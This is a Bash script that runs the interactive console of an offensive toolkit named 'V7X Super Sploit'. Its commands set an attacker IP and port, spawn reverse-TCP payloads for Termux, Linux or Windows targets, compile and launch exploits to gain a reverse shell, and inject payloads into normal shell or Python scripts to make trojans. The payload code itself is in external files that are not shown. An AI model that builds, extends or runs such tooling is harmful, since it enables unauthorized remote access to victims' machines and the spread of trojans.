#!/bin/bash
(morse hisa -f 2000 &) &> /dev/null
python3 anim/login.py
if [ ! -f log/logger ];then
   g++ log/manager.cpp -o log/logger &> /dev/null
fi
uid=$(id -u)
if [ ! -f converter/conv ];then
 gcc converter/main.c -o converter/conv
fi


sleep 0.1
black='\033[0;30m'
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[2;93m'
blue='\033[0;34m'
white='\033[0;97m'

Ublack="\033[4;30m"
Ured="\033[4;31m"
Ugreen="\033[4;32m"
Uyellow="\033[4;33m"
Ublue="\033[4;34m"
Upurple="\033[4;35m"
Ucyan="\033[4;36m"
Uwhite="\033[4;37m"

ba_black='\033[40m'
ba_red='\033[1;41m'
ba_blue='\033[1;44m'
ba_green='\033[1;42m'
ba_yellow='\033[1;43m'
ba_white='\033[0;47m'
sound(){
 ((morse $1) & ) &> /dev/null
}

banner(){
  sound "a"
  python3 anim/banner.py
}
convert(){
  if [ -f "$1" ] && [ "$2" != '' ];then
     converter/conv $1 $2
     sound "a"
     printf "$green[+]$white Converting Data from file $1.. Done\n"
     sleep 0.1
     printf "$green[+]$white Writing into $2............... Done\n"
  else
     printf "$red[-]$white Usage: convert <file1> <file2>\n"
     sound "s"
  fi
}
trojan(){
   if [ "$1" == '' ];then
     sound "s"
     printf "$red[-]$white Need One Argument: <trojan_file>\n"
   elif [ ! -f "$1" ]; then
     sound "s"
     printf "$red[-]$white File $1 Not Found\n"
   else
     sound "a"
     cp $1 trojans/
     printf "$green[+]$white File $1 Saved as a trojan in trojans directory\n"
   fi
}
payload(){
   if [ "$1" == '' ];then
     sound "s"
     printf "$red[-]$white Need One Argument: <trojan_file>\n"
   elif [ ! -f "$1" ]; then
     sound "s"
     printf "$red[-]$white File $1 Not Found\n"
   else
     sound "a"
     cp $1 payloads/
     printf "$green[+]$white File $1 Saved as a payload in payloads directory\n"
   fi
}
cls(){
clear
sound "a"
}
full_guide(){
    nano guide/a_usage
    nano guide/payloads.txt
    nano guide/warning.txt
}
rm ason/prepared.w &> /dev/null
export VSET_RUNNED=0
printf "$green[+]$yellow V7X - Super Sploit - Linux NightMare : this version support exploiting termux and All system with linux kernel, and windows\n"
sleep 0.05
printf "$green[+V7X+]$yellow Starting The VSS interactive console... (version 2.1)\n"
sleep 0.4
target_os=''
target(){
   if [ "$1" == "termux" ];then
        sound "a"
        target_os="termux"
        printf "$green[+]$white Using Termux Modules\n"
   elif [ "$1" == "linux" ];then
        sound "a"
        target_os="linux"
        printf "$green[+]$white Using Linux Modules\n"
   elif [ "$1" == "windows" ];then
        sound "a"
        target_os="windows"
        printf "$green[+]$white Using Windows Modules\n"
   elif [ "$1" == "boards" ];then
        sound "a"
        printf "$green[+]$white Using Boards Modules\n"
   elif [ "$1" == '' ];then
        sound "s"
        printf "$red[-]$white Please Choose a module\n"
   else
        sound "s"
        printf "$red[-]$white Module \'$1\' Not Found\n"
   fi
}

mode(){
   if [ "$1" == '' ];then
        sound "s"
        printf "$red[-]$white Please Apply A Mode\n"
   elif [ "$target_os" == '' ];then
        sound "s"
        printf "$red[-]$white Please Choose Target os before applying a mode\n"
   elif [ ! -f modes/"$target_os"/"$1"  ]; then
        sound "s"
        printf "$red[-]$white Mode $1 For Target $target_os Not Found\n"
   elif [ "$1" == 'auto' ] && [ "$target_os" != '' ];then
        printf "$green[+]$white Mode Auto Applied\n"
        sound "a"
        tmode=$(cat modes/$target_os/auto)
   else
        printf "$green[+]$white Mode $1 Applied For Target $target_os\n"
        sound "a"
        tmode=$1
   fi
}

info(){
  if [ "$1" == '' ]; then
       printf "$red[-]$white Usage: info <Command>\n"
  elif [ ! -f guide/info/$1 ];then
       printf "$red[-]$white Command $1 Not Found\n"
  else
       printf "$green$1:$white\n$(cat guide/info/$1)\n"
  fi
}
log(){
if [ "$1" == 'clear' ]; then
   sound "a"
   rm log/log.vcc
elif [ "$1" == 'show' ] && [ -f log/log.vcc ]; then
   sound "a"
   cat log/log.vcc
elif [ "$1" == 'id' ] && [ "$2" != '' ];then
   sound "a"
   cat log/log.vcc | grep "user ID: $2"
else
   sound "s"
fi
}

exploit_prog(){
if [ ! -f console/$target_os/$tmode/exploit ]
then
   sound "a"
   printf "$green[+]$white Compiling exploit..."
   gcc console/$target_os/$tmode/exploit.c -o console/$target_os/$tmode/exploit &> /dev/null
   sleep 1
   sound "a"
   printf "Done\n"
   sleep 0.5
fi
}
vset(){
   if  [ '$1' == '' ] || [ '$2' == '' ]
   then
       sound "s"
       printf "$red[!]$white Error: 'vset' Command Need 2 Argument: IP - Port\n"
   else
       sound "a"
       IP=$1
       PORT=$2
       export VSET_RUNNED=1
       printf "$green[+]$white Address Set To: ip: $1 -  port: $2\n"
       touch ason/prepared.w
   fi
}
build(){
   if [ "$1" == "" ];then
     sound "s"
     printf "$red[!]$white Error Spawning a Payload: need 1 argument: Name\n"
   elif [ ! -f ason/prepared.w ];then
     sound "s"
     printf "$red[!]$white Error Spawning a Payload: Please set IP and PORT using vset\n"
   elif [ "$target_os" == '' ];then
     sound "s"
     printf "$red[-]$white Error Spawning a Payload: Please set target os using target\n"
   elif [ "$tmode" == '' ];then
     sound "s"
     printf "$red[-]$white Error Spawning a Payload: Please Apply a mode or type 'mode auto'\n"
   else
     sound "a"
     python3 anim/payload_spawn_an.py
     NAME=$1
     cd console/$target_os/$tmode
     ./vcs.spawn $IP $PORT $NAME
     mv $NAME ../../../
     cd ../../../
     printf "$green[+]$white $1 Spawned\n"
     log/logger "user ID: $uid, Spawned a Payload --- Target: $target_os  |  Mode: $tmode  |  IP: $IP . Port: $PORT | Filename: $NAME"
   fi
}
clean(){
if [ "$target_os" == '' ] && [ "$target_os" == '' ];then
   sound "s"
   printf "$red[!]$white Please set target os & Mode Used before removing virus\n"
else
   sound "a"
   console/$target_os/$tmode/vcs.clean
fi
}
exploit(){
  if [ "$target_os" == '' ] ;then
    printf "$red[-]$white Please Set Target os Before starting exploit\n"
  elif [ "$tmode" == '' ];then
    printf "$red[-]$white Please Apply a Mode Before Starting Exploit\n"
  else
   exploit_prog
   sound "a"
   console/$target_os/$tmode/exploit $IP $PORT
   log/logger "user ID: $uid, Started an Exploit, @ IP: $IP | PORT: $PORT"
  fi
}
vexit(){
 exit
}
injsh(){
if [ "$1" == '' ] || [ "$2" == '' ] || [ "$3" == '' ];then
  sound "s"
  printf "$red[-]$white There Are A Missing Argument: 1: <payload.sh> 2: <normal_file.sh> 3: <result.sh>\n"
elif [ ! -f "$1" ] | [ ! -f "$2" ];then
  sound "s"
  printf "$red[-]$white Target File or Payload Does not exist\n"
else
  sound "a"
  printf "$yellow[L]$white Injecting Payload to $2 Data..."
  sleep 0.6
  printf "Done\n"
  sleep 0.1
  printf "$yellow[L]$white Storing Data in $3...\n"
  sleep 0.1
  scripts/shinjector $1 $2 $3
  log/logger "user ID: $uid Injected a shell script: $2, with file: $1, stored output in file: $3"
  python3 anim/pinsh.py

fi
}
injpy(){
if [ "$1" == '' ] || [ "$2" == '' ] || [ "$3" == '' ];then
  sound "s"
  printf "$red[-]$white There Are A Missing Argument: 1: <payload.sh> 2: <normal_file.py> 3: <result.py>\n"
elif [ ! -f "$1" ] || [ ! -f "$2" ];then
  sound "s"
  printf "$red[-]$white Target File or Payload Does not exist\n"
else
  sound "a"
  printf "$yellow[L]$white Injecting Payload to $2 Data..."
  sleep 0.6
  printf "Done\n"
  sleep 0.1
  printf "$yellow[L]$white Storing Data in $3...\n"
  sleep 0.1
  scripts/pyinjector $1 $2 $3
  log/logger "user ID: $uid Injected a python script: $2, with file: $1, stored output in file: $3"

  python3 anim/pinpy.py
fi
}
help(){
  sound "a"
  printf "Commands: \n"
  printf "$yellow          vset       : $white set attacker address\n"
  printf "$yellow          spawn      : $white Spawn a vss payload (reverse tcp to attacker address)\n"
  printf "$yellow          clean      : $white Remove Virus From The System (VSS virus)\n"
  printf "$yellow          exploit    : $white Exploit payload and Gain Access via reverse shell\n"
  printf "$yellow          target     : $white select target OS\n"
  printf "$yellow          cls        : $white clear screen\n"
  printf "$yellow          injsh      : $white Inject payload in shell  script  $green      (  Shell  Trojan   ) \n"
  printf "$yellow          injpy      : $white Inject payload in python script  $green      (  Python Trojan   ) \n"
  printf "$yellow          zsession   : $white Start Z-Session For File Upload & Download\n"
  printf "$yellow          full_guide : $white Read the tool guide\n"
  printf "$yellow          mode       : $white Set Mode (Before Spawning a payload)\n"
  printf "$yellow          log        : $white Log manager\n"
  printf "$yellow          convert    : $white Rotate a File                    $green      ( Cipher Text Rotation )\n"
  printf "$yellow          info       : $white Get info about a command\n"
  printf "$yellow          show       : $white Show an Option or all options\n"
  printf "$yellow          trojan     : $white Save a file as a trojan in trojans directory\n"
  printf "$yellow          payload    : $white Save a file as a payload in payloads directory\n"
  printf "$yellow          banner     : $white Show Banner\n"
  printf "$yellow          exit       : $white exit\n"
  printf "                                \n"
}

zsession(){
   if [ "$IP" == "" ] || [ "$PORT" == '' ];then
     sound "s"
     printf "$red[-]$white Error: IP and PORT not prepared yet\n"
   elif [ "$target_os" == '' ];then
     sound "s"
     printf "$red[-]$white Error: Please Select Target os\n"
   else
     sound "a"
     xterm -e bash fts/manager.sh $IP $PORT &
   fi
}

show(){
   if [ "$#" == 0 ];then
     printf "$red[-]$white Usage: show options\n"
   elif [ "$1" == "options" ]; then
     printf "Options:\n--------\nIP: $IP \nPORT: $PORT \nTARGET: $target_os \nMODE: $tmode\n"
   fi
}

while [ 1 ];do
 printf "$green[<]$green ($yellow/VSS$green)$red->$white "
 read vcmd
 (pkill -9 morse) &
 if [ -f /bin/$(echo $vcmd | head -n1 | awk '{print $1;}') ];then
    sound "s"
    printf "$red[-]$white Shell Commands blocked inside VSS\n"
 elif [ '$vcmd' == '' ];then
    printf ''; break;
 elif [ -f data/$(echo $vcmd | head -n1 | awk '{print $1;}') ];then
    $vcmd
 elif [ "$vcmd" == '' ];then
    printf '\n'
 else
    sound "s"
    printf "$red[-]$white Command Not Found: $(echo $vcmd | head -n1 | awk '{print $1;}')\n"

 fi
done
